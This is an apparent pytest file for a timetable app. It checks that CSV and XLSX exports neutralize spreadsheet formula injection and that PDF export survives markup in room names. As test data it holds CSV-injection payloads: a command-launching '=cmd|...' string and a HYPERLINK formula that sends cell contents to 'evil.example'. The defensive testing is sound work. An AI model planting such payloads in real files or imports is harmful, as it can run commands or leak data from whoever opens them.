"""Phase 10 PART 19/20: exported files never carry an executable formula or
broken PDF markup, even when the underlying data came from an imported CSV
an admin didn't personally type."""
from __future__ import annotations

import csv
import io

from openpyxl import load_workbook

from app.exporters import _safe_cell
from app.grid import build_grid
from app.models import Faculty, Room, Section, Subject
from app.solver.run import generate

from constraint_checker import check_all


def test_safe_cell_neutralizes_every_known_formula_trigger():
    for trigger in ("=", "+", "-", "@", "\t", "\r"):
        dangerous = f"{trigger}cmd|'/c calc'!A1"
        safe = _safe_cell(dangerous)
        assert safe.startswith("'"), f"trigger {trigger!r} was not neutralized"
        assert safe[1:] == dangerous


def test_safe_cell_leaves_normal_text_untouched():
    for normal in ("A101", "Dr. A. Sharma", "CS201", "38-502 (Block C)"):
        assert _safe_cell(normal) == normal


def test_room_import_with_a_formula_payload_is_exported_as_literal_text(client, db_session, context):
    """The realistic end-to-end path: a malicious room_number survives
    import (bulk_import.py validates shape, not content - a room number is
    just a string), so the export layer is the one place this must be
    neutralized."""
    payload = "=HYPERLINK(\"http://evil.example/\"&A1,\"click\")"
    buf = io.StringIO()
    writer = csv.writer(buf, lineterminator="\n")
    writer.writerow(["block", "floor", "room_number", "capacity", "room_type"])
    writer.writerow(["A", "1", payload, "70", "theory"])
    csv_body = buf.getvalue()
    resp = client.post(
        "/api/bulk-import/rooms/apply",
        files={"file": ("rooms.csv", io.BytesIO(csv_body.encode()), "text/csv")},
        data={"mode": "add_update"},
    )
    assert resp.status_code == 200
    assert resp.json()["committed"] is True

    cs201 = Subject(name="Data Structures", code="CS201", type="theory",
                     session_length_hours=1, sessions_per_week=1)
    fac = Faculty(name="Dr. A", faculty_code="FAC01")
    fac.subjects = [cs201]
    section = Section(academic_context_id=context.id, section_number="S-A", strength=1)
    section.subjects = [cs201]
    room = db_session.query(Room).filter(Room.capacity == 70).one()
    room.capacity = 1  # force the solver to actually use this room, not skip it
    db_session.add_all([cs201, fac, section])
    db_session.add_all(build_grid())
    db_session.commit()

    result, run = generate(db_session, academic_context_id=context.id, soft=False, max_seconds=20)
    assert result.status in {"OPTIMAL", "FEASIBLE"}
    assert check_all(db_session, run.id) == []

    csv_resp = client.get(f"/api/export/master.csv?run_id={run.id}")
    assert csv_resp.status_code == 200
    rows = list(csv.reader(io.StringIO(csv_resp.text)))
    room_col = rows[0].index("Room")
    room_cell = next(r[room_col] for r in rows[1:] if payload[1:] in r[room_col])
    # The room is exported by its code ("A-=HYPERLINK..."), which no longer
    # starts with the trigger - but the property that matters is the general
    # one: no exported cell may begin with a formula trigger.
    assert room_cell
    triggers = ("=", "+", "-", "@", "\t", "\r")
    assert all(not cell.startswith(triggers) for row in rows[1:] for cell in row), (
        "a formula-triggering value must be neutralized in CSV export"
    )

    xlsx_resp = client.get(f"/api/export/master.xlsx?run_id={run.id}")
    wb = load_workbook(io.BytesIO(xlsx_resp.content))
    ws = wb["Master Timetable"]
    header = [c.value for c in ws[1]]
    room_idx = header.index("Room")
    found = [row[room_idx] for row in ws.iter_rows(min_row=2, values_only=True) if row[room_idx]]
    assert any(payload[1:] in str(v) for v in found)
    assert all(
        not str(v).startswith(triggers)
        for row in ws.iter_rows(min_row=2, values_only=True) for v in row if isinstance(v, str)
    ), "the same value must be neutralized in the XLSX export"


def test_pdf_export_does_not_crash_on_markup_like_characters_in_data(client, db_session, context):
    """A room number containing reportlab-markup-like characters must not
    break PDF generation or leak raw tags into the layout."""
    csv_body = 'block,floor,room_number,capacity,room_type\nA,1,<b>A101</b>,70,theory\n'
    resp = client.post(
        "/api/bulk-import/rooms/apply",
        files={"file": ("rooms.csv", io.BytesIO(csv_body.encode()), "text/csv")},
        data={"mode": "add_update"},
    )
    assert resp.status_code == 200
    assert resp.json()["committed"] is True

    room = db_session.query(Room).filter(Room.room_number == "<b>A101</b>").one()
    cs201 = Subject(name="Data Structures", code="CS201", type="theory",
                     session_length_hours=1, sessions_per_week=1)
    fac = Faculty(name="Dr. A", faculty_code="FAC01")
    fac.subjects = [cs201]
    section = Section(academic_context_id=context.id, section_number="S-A", strength=1)
    section.subjects = [cs201]
    room.capacity = 1
    db_session.add_all([cs201, fac, section])
    db_session.add_all(build_grid())
    db_session.commit()

    result, run = generate(db_session, academic_context_id=context.id, soft=False, max_seconds=20)
    assert result.status in {"OPTIMAL", "FEASIBLE"}

    pdf_resp = client.get(f"/api/export/room/{room.id}.pdf?run_id={run.id}")
    assert pdf_resp.status_code == 200
    assert pdf_resp.content[:4] == b"%PDF"


def test_bulk_import_rejects_a_disallowed_file_extension(client):
    resp = client.post(
        "/api/bulk-import/rooms/preview",
        files={"file": ("rooms.exe", io.BytesIO(b"not a spreadsheet"), "application/octet-stream")},
        data={"mode": "add_update"},
    )
    assert resp.status_code == 422
    assert "csv" in resp.json()["detail"].lower()
